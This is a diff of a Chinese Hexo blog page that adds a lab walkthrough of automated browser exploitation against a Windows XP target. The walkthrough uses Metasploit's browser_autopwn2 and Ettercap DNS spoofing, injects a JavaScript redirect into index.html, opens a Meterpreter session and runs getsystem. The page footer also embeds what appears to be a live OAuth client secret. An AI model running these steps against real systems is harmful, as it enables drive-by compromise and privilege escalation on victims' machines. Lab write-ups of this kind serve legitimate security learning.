@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="攻击测试,kali Linux,Ettercap,Metasploit,browser_autopwn2,">
 
 
 
@@ -86,13 +86,24 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Jacky Cheng">
-<meta property="og:url" content="https://cjjkkk.github.io/tags/Cobalt-Strike/index.html">
+<meta name="description" content="前言 攻击过程    一. 前言1. MSF模块：browser_autopwn2browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。">
+<meta name="keywords" content="攻击测试,kali Linux,Ettercap,Metasploit,browser_autopwn2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用MSF和Ettercap进行自动化浏览器攻击">
+<meta property="og:url" content="https://cjjkkk.github.io/msf-browser-autopwn2/index.html">
 <meta property="og:site_name" content="Jacky Cheng">
+<meta property="og:description" content="前言 攻击过程    一. 前言1. MSF模块：browser_autopwn2browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://cjjkkk.github.io/image/msf-browser-autopwn2/1.png">
+<meta property="og:image" content="https://cjjkkk.github.io/image/msf-browser-autopwn2/2.png">
+<meta property="og:image" content="d:/github_blog/source/image/msf-browser-autopwn2/3.png">
+<meta property="og:image" content="https://cjjkkk.github.io/image/msf-browser-autopwn2/4.png">
+<meta property="og:image" content="https://cjjkkk.github.io/image/msf-browser-autopwn2/5.png">
+<meta property="og:updated_time" content="2019-04-09T12:45:59.861Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Jacky Cheng">
+<meta name="twitter:title" content="使用MSF和Ettercap进行自动化浏览器攻击">
+<meta name="twitter:description" content="前言 攻击过程    一. 前言1. MSF模块：browser_autopwn2browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。">
+<meta name="twitter:image" content="https://cjjkkk.github.io/image/msf-browser-autopwn2/1.png">
 
 
 
@@ -122,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="https://cjjkkk.github.io/tags/Cobalt-Strike/">
+  <link rel="canonical" href="https://cjjkkk.github.io/msf-browser-autopwn2/">
 
 
 
 
 
-  <title>标签: Cobalt Strike | Jacky Cheng</title>
+  <title>使用MSF和Ettercap进行自动化浏览器攻击 | Jacky Cheng</title>
   
 
 
@@ -147,7 +158,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -273,52 +284,303 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Cobalt Strike<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cjjkkk.github.io/msf-browser-autopwn2/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jacky Cheng">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="http://ppdfs8ipn.bkt.clouddn.com/avatar.jpg?e=1554282820&token=RE6ntvyYAB-x6fGKaUcbeUISRnJdbNLB0HXZVNru:7n86rrWA7ll5qJ1ekk7R60fnZ2M">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jacky Cheng">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/cobalt-strike/" itemprop="url">
-              
-                <span itemprop="name">使用Cobalt Strike生成Windows木马并攻击靶机的简单测试</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">使用MSF和Ettercap进行自动化浏览器攻击</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-03-28T14:27:06+08:00" content="2019-03-28">
-          03-28
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T20:09:59+08:00">
+                2019-04-09
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻击测试/" itemprop="url" rel="index">
+                    <span itemprop="name">攻击测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  348
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<ul>
+<li>前言</li>
+<li>攻击过程</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h2><h3 id="1-MSF模块：browser-autopwn2"><a href="#1-MSF模块：browser-autopwn2" class="headerlink" title="1. MSF模块：browser_autopwn2"></a>1. MSF模块：browser_autopwn2</h3><p>browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。</p>
+<a id="more"></a>
+<p><br></p>
+<h2 id="二-攻击过程"><a href="#二-攻击过程" class="headerlink" title="二. 攻击过程"></a>二. 攻击过程</h2><h3 id="1-攻击环境"><a href="#1-攻击环境" class="headerlink" title="1. 攻击环境"></a>1. 攻击环境</h3><blockquote>
+<p>攻击机：kali linux 2019.1</p>
+<p>靶机：Windows xp Professional sp3</p>
+</blockquote>
+<h3 id="2-攻击步骤"><a href="#2-攻击步骤" class="headerlink" title="2. 攻击步骤"></a>2. 攻击步骤</h3><h4 id="2-1-使用Ettercap进行DNS欺骗"><a href="#2-1-使用Ettercap进行DNS欺骗" class="headerlink" title="2.1 使用Ettercap进行DNS欺骗"></a>2.1 使用Ettercap进行DNS欺骗</h4><p>该过程参考<a href="https://cjjkkk.github.io/ettercap-DNS%E6%AC%BA%E9%AA%97/">使用Ettercap实现DNS欺骗的简单测试</a>一文</p>
+<h4 id="2-2-使用browser-autopwn2模块生成恶意URL"><a href="#2-2-使用browser-autopwn2模块生成恶意URL" class="headerlink" title="2.2 使用browser_autopwn2模块生成恶意URL"></a>2.2 使用browser_autopwn2模块生成恶意URL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfdb init</span><br><span class="line">msfconsole</span><br><span class="line">search browser_autopwn2</span><br><span class="line">use auxiliary/server/browser_autopwn2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="2-3-添加跳转脚本"><a href="#2-3-添加跳转脚本" class="headerlink" title="2.3 添加跳转脚本"></a>2.3 添加跳转脚本</h4><p>进入网站目录下，修改<code>index.html</code>文件，设置如下内容</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"javascript"</span> type=<span class="string">"text/javascript"</span>&gt; </span><br><span class="line"><span class="comment">// 以下方式定时跳转</span></span><br><span class="line">setTimeout(<span class="string">"javascript:location.href='Hello！'"</span>, <span class="number">1000</span>); </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意将<code>Hello!</code>修改为MSF生成的恶意url</p>
+<h4 id="2-4-靶机访问"><a href="#2-4-靶机访问" class="headerlink" title="2.4 靶机访问"></a>2.4 靶机访问</h4><p>靶机访问百度网站，可以看到页面跳转，此时MSF已经开始进行攻击</p>
+<p><img src="\image\msf-browser-autopwn2\1.png" alt="1"></p>
+<h4 id="2-5-启动会话"><a href="#2-5-启动会话" class="headerlink" title="2.5 启动会话"></a>2.5 启动会话</h4><p>MSF创建会话之后，我们需要手动启用会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure>
+<p><img src="\image\msf-browser-autopwn2\2.png" alt="2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1	#1为目标机器id</span><br></pre></td></tr></table></figure>
+<p><img src="D:\github_blog\source\image\msf-browser-autopwn2\3.png" alt="3"></p>
+<p>在攻击过程中可能会出现浏览器崩溃等情况，可以多尝试几次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+<p><img src="\image\msf-browser-autopwn2\4.png" alt="4"></p>
+<p>关于命令行乱码问题可以调整Linux终端的编码类型为GBK2312</p>
+<p><img src="\image\msf-browser-autopwn2\5.png" alt="5"></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    	<br>
+    	<br>
+        <div style="text-align:center;color: #000000;font-size:14px;">-------------本文结束<i class="fa fa-gift"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/msf-browser-autopwn2/">使用MSF和Ettercap进行自动化浏览器攻击</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Jacky Cheng 的个人博客">Jacky Cheng</a></p>
+  <p><span>发布时间:</span>2019年04月09日 - 20:04</p>
+  <p><span>最后更新:</span>2019年04月09日 - 20:04</p>
+  <p><span>原始链接:</span><a href="/msf-browser-autopwn2/" title="使用MSF和Ettercap进行自动化浏览器攻击">https://cjjkkk.github.io/msf-browser-autopwn2/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://cjjkkk.github.io/msf-browser-autopwn2/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+	  $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+	    });
+    });  
+</script>
+<br>
 
       
     </div>
 
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>想喝快乐水</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/image/wechatpay.jpg" alt="Jacky Cheng 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/image/alipay.jpg" alt="Jacky Cheng 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/攻击测试/" rel="tag"><i class="fa fa-tag"></i> 攻击测试</a>
+          
+            <a href="/tags/kali-Linux/" rel="tag"><i class="fa fa-tag"></i> kali Linux</a>
+          
+            <a href="/tags/Ettercap/" rel="tag"><i class="fa fa-tag"></i> Ettercap</a>
+          
+            <a href="/tags/Metasploit/" rel="tag"><i class="fa fa-tag"></i> Metasploit</a>
+          
+            <a href="/tags/browser-autopwn2/" rel="tag"><i class="fa fa-tag"></i> browser_autopwn2</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/sqli-libs-first/" rel="next" title="SQLi-Labs第一关">
+                <i class="fa fa-chevron-left"></i> SQLi-Labs第一关
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -326,6 +588,13 @@
 
 
           
+
+  
+    <div id="gitalk-container">
+  </div>
+  
+
+
 
         </div>
         
@@ -346,8 +615,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -443,6 +721,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-MSF模块：browser-autopwn2"><span class="nav-text">1. MSF模块：browser_autopwn2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-攻击过程"><span class="nav-text">二. 攻击过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-攻击环境"><span class="nav-text">1. 攻击环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-攻击步骤"><span class="nav-text">2. 攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-使用Ettercap进行DNS欺骗"><span class="nav-text">2.1 使用Ettercap进行DNS欺骗</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-使用browser-autopwn2模块生成恶意URL"><span class="nav-text">2.2 使用browser_autopwn2模块生成恶意URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-添加跳转脚本"><span class="nav-text">2.3 添加跳转脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4-靶机访问"><span class="nav-text">2.4 靶机访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5-启动会话"><span class="nav-text">2.5 启动会话</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -594,6 +888,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -634,6 +932,22 @@
 
 
 
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'ee53cc5de9d57711e0cb',
+          clientSecret: '46a58ced62224ebedbadafff96c5860f097e9d66',
+          repo: 'CJJKKK.github.io',
+          owner: 'CJJKKK',
+          admin: ['CJJKKK'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
 
   
 
